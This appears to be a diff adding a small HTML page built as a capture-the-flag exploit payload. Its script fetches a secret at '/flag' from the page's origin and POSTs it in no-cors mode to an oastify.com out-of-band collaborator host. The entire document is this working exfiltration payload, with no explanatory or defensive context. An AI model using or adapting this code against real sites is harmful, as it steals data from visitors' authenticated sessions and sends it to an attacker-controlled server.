@@ -1,0 +1,13 @@
+<html>
+  <script>
+(async () => {
+  const flag = await fetch('/flag').then(r => r.text());
+
+  await fetch('http://vxwnmfmrm9jci0saup5kchw35ublzcn1.oastify.com/flag', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: flag
+  });
+})();
+</script>
+</html>
